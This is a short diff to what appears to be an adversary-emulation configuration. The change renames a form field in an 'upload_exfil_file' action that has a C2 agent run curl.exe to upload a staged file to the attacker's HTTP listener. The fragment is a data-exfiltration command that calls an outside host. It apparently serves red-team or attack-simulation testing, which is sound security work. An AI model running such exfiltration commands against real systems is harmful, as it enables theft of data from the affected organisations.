@@ -416,7 +416,7 @@ action "execute_agent_shell_command" "upload_exfil_file" {
     timeout           = "600"
     task_name         = resource.task.c2_task.task_name
     agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
-    command           = "c:\Windows\System32\curl.exe -k -F file=@${variable.exfil_path}\${variable.exfil_file} https://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}:443/upload"
+    command           = "c:\Windows\System32\curl.exe -k -F files=@${variable.exfil_path}\${variable.exfil_file} https://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}:443/upload"
     wait_for_results  = "true"
     depends_on        = action.execute_agent_shell_command.create_exfil_file
 }
